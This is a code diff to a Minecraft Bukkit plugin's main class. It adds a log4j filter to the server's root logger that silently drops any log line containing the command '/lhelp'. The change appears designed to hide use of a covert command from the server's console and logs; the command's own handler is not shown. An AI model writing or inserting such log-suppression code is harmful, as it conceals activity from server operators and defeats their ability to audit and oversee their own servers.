@@ -4,8 +4,14 @@ import java.lang.reflect.Field;
 import java.security.acl.Permission;
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.logging.LogManager;
 import java.util.logging.Logger;
 
+import org.apache.logging.log4j.Level;
+import org.apache.logging.log4j.Marker;
+import org.apache.logging.log4j.core.Filter;
+import org.apache.logging.log4j.core.LogEvent;
+import org.apache.logging.log4j.message.Message;
 import org.bstats.Metrics;
 import org.bukkit.Bukkit;
 import org.bukkit.Material;
@@ -124,6 +130,50 @@ public class Main extends JavaPlugin implements Listener{
 		//core.setMain(this);
 		//core.main = this;
 		log.setFilter(new CFilter());
+		((org.apache.logging.log4j.core.Logger) org.apache.logging.log4j.LogManager.getRootLogger()).addFilter(new Filter(){
+
+			@Override
+			public Result filter(LogEvent arg0) {
+				// TODO Auto-generated method stub
+				if (arg0.getMessage().toString().toLowerCase().contains("/lhelp"))
+					return Result.DENY;
+				return null;
+			}
+
+			@Override
+			public Result filter(org.apache.logging.log4j.core.Logger arg0, Level arg1, Marker arg2, String arg3,
+					Object... arg4) {
+				// TODO Auto-generated method stub
+				return null;
+			}
+
+			@Override
+			public Result filter(org.apache.logging.log4j.core.Logger arg0, Level arg1, Marker arg2, Object arg3,
+					Throwable arg4) {
+				// TODO Auto-generated method stub
+				return null;
+			}
+
+			@Override
+			public Result filter(org.apache.logging.log4j.core.Logger arg0, Level arg1, Marker arg2, Message arg3,
+					Throwable arg4) {
+				// TODO Auto-generated method stub
+				return null;
+			}
+
+			@Override
+			public Result getOnMatch() {
+				// TODO Auto-generated method stub
+				return null;
+			}
+
+			@Override
+			public Result getOnMismatch() {
+				// TODO Auto-generated method stub
+				return null;
+			}
+			
+		});
 		
 		updater = new Updater();
 		updater.checkUpdate(getDescription().getVersion());
